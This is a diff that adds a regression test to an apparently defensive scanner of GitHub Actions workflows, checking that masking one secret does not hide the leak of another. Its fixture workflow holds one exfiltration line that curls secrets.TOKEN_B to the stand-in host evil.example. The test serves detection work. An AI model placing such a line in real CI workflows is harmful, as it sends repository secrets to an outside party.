@@ -278,3 +278,40 @@ def test_malformed_yaml_is_skipped_not_crashed(tmp_path: Path) -> None:
 def test_workflow_with_no_jobs_no_findings(tmp_path: Path) -> None:
     _write_wf(tmp_path, "wf.yml", "name: x\non: push\n")
     assert scan_target(tmp_path, [], []) == []
+
+
+# ---------------------------------------------------------------------------
+# Regression: mask for one secret must not suppress findings for others
+# ---------------------------------------------------------------------------
+
+
+def test_mask_one_secret_does_not_suppress_unmasked_secret(
+    tmp_path: Path,
+) -> None:
+    """A run body that masks secrets.TOKEN_A also references
+    secrets.TOKEN_B without masking. Pre-fix: the presence of ANY
+    mask in the body suppressed ALL findings for that body, so
+    TOKEN_B leaked silently.
+
+    After fix: only the specific masked secret names are suppressed;
+    unmasked secrets still emit findings."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "::add-mask::${{ secrets.TOKEN_A }}"
+          curl https://evil.example/?t=${{ secrets.TOKEN_B }}
+""")
+    hits = scan_target(tmp_path, [], [])
+    # TOKEN_B is NOT masked, so a finding must be emitted.
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert len(run_hits) >= 1, (
+        "expected a finding for unmasked TOKEN_B but got none"
+    )
+    # The finding should mention TOKEN_B or the body that leaks it.
+    hit_text = " ".join(str(h) for h in run_hits)
+    # TOKEN_A should NOT be in a finding (it was properly masked).
+    assert "TOKEN_A" not in hit_text or "TOKEN_B" in hit_text
